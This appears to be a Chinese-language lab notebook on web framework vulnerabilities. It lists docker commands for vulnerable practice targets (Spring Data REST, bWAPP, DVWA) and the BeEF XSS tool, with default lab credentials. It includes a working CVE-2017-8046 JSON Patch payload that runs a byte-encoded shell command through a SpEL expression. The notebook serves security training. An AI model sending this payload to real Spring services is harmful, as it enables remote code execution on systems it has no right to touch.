### 框架安全问题
1. Spring Data Rest
    0. 漏洞编码: CVE-2017-8046
    1. 靶机下载/运行
        ```
        docker pull registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest
        docker run -d -p 8795:8080 registry.cn-shanghai.aliyuncs.com/yhskc/spring-data-rest
        ```
    2. 访问靶机地址
        1. 检查访问地址
            ```
                localhost:8795/customers
            ```
        2. 正常访问
            ```
                curl -X -POST -H "Content-Type:application/json-patch+json" -d '{"fristname":"kenny","lastname": "he"}' http://localhost:8795/customers
            ```
        3. 漏洞访问
            - Brut Site 修改请求报文
                1. 修改参数为PATCH
                2. 修改Content-Type为application/json-patch+json
                3. 修改payload，其中数字为ASCII码
                    ```
                        [{"op":"replace","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname","value":"test"}]
                   ```
### Struts2 安全漏洞


### 工具
####  BWApp 漏洞环境
1. BWApp 漏洞环境安装
    ```
    docker pull registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
    docker run -d -p 8796:80 --name=bwapp registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
    ```
2. 访问地址，进行漏洞环境数据库安装
```
http://localhost:8796/install.php
```
#### DVWA 靶机
1. DVWA 靶机环境安装(账号:admin/密码:password)
```
docker pull registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
docker run -d -p 8797:80 registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
```
### 漏洞利用工具
#### XSS 漏洞利用工具
1. BeEF(自带JS脚本、后台界面): 账号/密码 sec
    ```
        docker run -d -p 3000:3000 --name=beef registry.cn-shanghai.aliyuncs.com/yhskc/beef
    ```
### FUZZ